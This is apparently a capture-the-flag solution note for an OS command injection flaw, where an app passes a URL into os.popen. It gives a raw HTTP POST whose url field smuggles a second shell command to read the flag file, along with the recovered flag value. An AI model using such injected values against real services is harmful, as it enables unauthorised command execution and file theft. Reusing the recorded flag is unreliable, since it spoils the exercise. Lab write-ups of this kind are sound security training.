# OS Command Injection via url parameter. The app uses os.popen() with the URL directly in a shell command. Check is 'if 200 in response' so injected output appears in the message field alongside the HTTP status code. FLAG: FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}

POST /add_url HTTP/1.1
Host: 172.17.0.1:59635
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

url=http://example.com"; cat /app/flag.txt 2>&1 #